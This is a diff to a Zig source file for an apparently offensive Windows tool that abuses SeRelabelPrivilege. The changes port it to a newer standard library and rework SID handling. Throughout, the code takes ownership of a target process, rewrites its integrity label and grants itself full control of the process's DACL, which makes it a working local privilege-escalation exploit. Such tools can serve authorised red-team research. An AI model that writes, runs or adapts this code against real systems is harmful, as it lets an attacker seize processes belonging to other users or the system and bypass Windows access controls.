@@ -49,7 +49,7 @@ const Action = struct {
         };
     }
 
-    fn takeProcessOwnership(pid: u32, puSid: []u64) !void {
+    fn takeProcessOwnership(pid: u32, ppSID: win32.PSID) !void {
         std.log.debug(("[+] takeProcessOwnership: OpenProcess({d})"), .{pid});
 
         // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
@@ -66,24 +66,23 @@ const Action = struct {
         var si: u32 = @bitCast(win32.OWNER_SECURITY_INFORMATION);
         si |= @bitCast(win32.LABEL_SECURITY_INFORMATION);
 
-        const pSid: ?*win32.PSID = @ptrCast(@constCast(&puSid));
-        // var sida: ?win32.PSTR = null;
-        // // https://learn.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertsidtostringsida
-        // if (0 == win32.ConvertSidToStringSidA(
-        //     pSid.?.*,
-        //     &sida,
-        // )) {
-        //     std.log.err("\t TakeProcessOwnership.ConvertSidToStringSidA:CopySid failed. GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
-        //     return Error.AccountNotFound;
-        // }
-        // std.log.debug("TakeProcessOwnership.SID: {s}\n", .{sida.?});
+        var sida: ?win32.PSTR = null;
+        // https://learn.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertsidtostringsida
+        if (0 == win32.ConvertSidToStringSidA(
+            ppSID,
+            &sida,
+        )) {
+            std.log.err("\t TakeProcessOwnership.ConvertSidToStringSidA:CopySid failed. GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
+            return Error.AccountNotFound;
+        }
+        std.log.debug("TakeProcessOwnership.SID: {s}\n", .{sida.?});
 
         // https://learn.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-setsecurityinfo
         const dwRes: u32 = win32.SetSecurityInfo(
             hProc,
             win32.SE_KERNEL_OBJECT,
             si,
-            pSid.?.*,
+            ppSID,
             null,
             null,
             null,
@@ -100,7 +99,7 @@ const Action = struct {
         utility.closeHandle(hProc);
     }
 
-    fn grantProcessFullControl(_: std.mem.Allocator, pid: u32, puSid: []u64) !void {
+    fn grantProcessFullControl(_: std.mem.Allocator, pid: u32, ppSID: win32.PSID) !void {
         var pOldDACL: ?*win32.ACL = null;
         var pNewDACL: ?*win32.ACL = null;
         var pSD: ?win32.PSECURITY_DESCRIPTOR = null;
@@ -149,7 +148,7 @@ const Action = struct {
 
         std.log.debug(("[+] grantProcessFullControl: GetSecurityInfo({d})"), .{pid});
 
-        const pSid: ?*win32.PSID = @ptrCast(@constCast(&puSid));
+        const pSid: ?*win32.PSID = @constCast(&ppSID);
         // var sida: ?win32.PSTR = null;
         // // https://learn.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertsidtostringsida
         // if (0 == win32.ConvertSidToStringSidA(pSid.?.*, &sida)) {
@@ -220,29 +219,22 @@ const Action = struct {
 
         var ppSid = try utility.getProcessOwnerSID(self.allocator, self.sourceProcessToken);
 
-        if (ppSid.* == null) {
-            std.log.debug("getProcessOwnerSID failed", .{});
-            return Action.Error.AccountNotFound;
-        }
-
-        takeProcessOwnership(self.targetPID, ppSid.*.?) catch |err| {
+        takeProcessOwnership(self.targetPID, ppSid.sid()) catch |err| {
             std.log.err("Failed takeProcessOwnership {any}\n", .{err});
             return Action.Error.NoMemory;
         };
 
         std.log.debug("TakeProcessOwnership: Successfully took ownership of the process {d}\n", .{self.targetPID});
+        ppSid.deinit(self.allocator);
 
         ppSid = try utility.getProcessOwnerSID(self.allocator, self.sourceProcessToken);
 
-        if (ppSid.* == null) {
-            std.log.debug("getProcessOwnerSID failed", .{});
-            return Action.Error.AccountNotFound;
-        }
-
-        grantProcessFullControl(self.allocator, self.targetPID, ppSid.*.?) catch |err| {
+        grantProcessFullControl(self.allocator, self.targetPID, ppSid.sid()) catch |err| {
             std.log.err("attemptRelabel: Failed grantProcessFullControl {any}\n", .{err});
             return Action.Error.NoMemory;
         };
+
+        ppSid.deinit(self.allocator);
 
         std.log.debug("Successfully took full control of the process {d}\n", .{self.targetPID});
     }
@@ -382,24 +374,25 @@ const Action = struct {
         std.log.info("\n", .{});
     }
 
-    pub fn parseUsername(self: *Self, line: []u8) !void {
+    pub fn parseUsername(self: *Self, line: [:0]const u8) !void {
         self.lpAccountName = try std.fmt.allocPrintSentinel(self.allocator, "{s}", .{line}, 0);
         errdefer self.allocator.free(self.lpAccountName);
     }
 
-    pub fn parsePID(self: *Self, line: []u8) !void {
-        self.targetPID = std.fmt.parseInt(u32, line, 10) catch undefined;
+    pub fn parsePID(self: *Self, line: [:0]const u8) !void {
+        self.targetPID = try std.fmt.parseInt(u32, line, 10);
     }
 
     pub fn deinit(self: *Self) void {
         defer self.allocator.free(self.lpAccountName);
     }
 };
-
-pub fn usage(argv: []u8) !void {
-    const stdout = std.io.getStdOut().writer();
-
-    try stdout.print(
+pub fn usage(
+    allocator: std.mem.Allocator,
+    io: std.Io,
+    argv: [:0]const u8,
+) !void {
+    const buffer: []u8 = try std.fmt.allocPrint(allocator,
         \\  This tool exist thanks to https://decoder.cloud/2024/05/30/abusing-the-serelabelprivilege/
         \\
         \\Example:
@@ -412,20 +405,20 @@ pub fn usage(argv: []u8) !void {
         \\
     , .{ argv, argv });
 
-    std.posix.exit(0);
+    try std.Io.File.stdout().writeStreamingAll(io, buffer);
+
+    std.process.exit(0);
 }
 
-pub fn main() !void {
-    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
+pub fn main(init: std.process.Init) !void {
+    var gpa = std.heap.DebugAllocator(.{}){};
     const allocator = gpa.allocator();
     defer _ = gpa.deinit();
 
-    // Parse args into string array (error union needs 'try')
-    const args = try std.process.argsAlloc(allocator);
-    defer std.process.argsFree(allocator, args);
+    const args = try init.minimal.args.toSlice(init.arena.allocator());
 
     if (args.len != 3) {
-        try usage(args[0]);
+        try usage(allocator, init.io, args[0]);
     }
 
     var action = try Action.init(allocator);
@@ -446,11 +439,12 @@ pub fn main() !void {
     }
 
     action.debug();
+
     try action.attemptRelabel();
 
     // try action.spawnProcessFromPID();
 
     std.log.info("[+] Done", .{});
 
-    std.posix.exit(0);
+    std.process.exit(0);
 }
